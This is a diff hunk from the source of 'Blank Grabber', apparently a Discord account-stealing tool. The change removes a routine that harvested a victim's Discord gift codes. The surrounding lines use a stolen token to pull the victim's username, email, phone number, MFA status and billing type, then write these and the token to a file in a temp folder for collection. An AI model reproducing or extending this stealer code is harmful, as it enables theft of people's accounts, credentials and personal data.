@@ -511,24 +511,9 @@ class BlankGrabber:
                             billing = "Card"
                         else:
                             billing = "Paypal"
-                
-                gifts = []
                 r = self.http.request("GET", "https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers= self.headers(token)).data.decode()
-                if "code" in r:
-                    r = json.loads(r)
-                    for i in r:
-                        code = i.get("code")
-                        if i.get("promotion") is None:
-                            continue
-                        title = i["promotion"].get("outbound_title")
-                        if code and title:
-                            gifts.append(f"{title}: {code}")
-                if len(gifts) == 0:
-                    gifts = "Gift Codes: (NONE)"
-                else:
-                    gifts = "Gift Codes:\n\t" + "\n\t".join(gifts)
 
-                data.append(f"{'Blank Grabber'.center(90, '-')}\n\nUsername: {user}\nUser ID: {id}\nMFA: {mfa}\nEmail: {email}\nPhone: {phone}\nVerified: {verified}\nNitro: {nitro_data}\nBilling Info: {billing}\n\nToken: {token}\n\n{gifts}")
+                data.append(f"{'Blank Grabber'.center(90, '-')}\n\nUsername: {user}\nUser ID: {id}\nMFA: {mfa}\nEmail: {email}\nPhone: {phone}\nVerified: {verified}\nNitro: {nitro_data}\nBilling Info: {billing}\n\nToken: {token}")
         if len(data)!= 0:
             os.makedirs(discfolder := os.path.join(self.tempfolder, "Messenger", "Discord"), exist_ok= True)
             with open(os.path.join(discfolder, "Discord Info.txt"), "w", encoding= "utf-8", errors="ignore") as file:
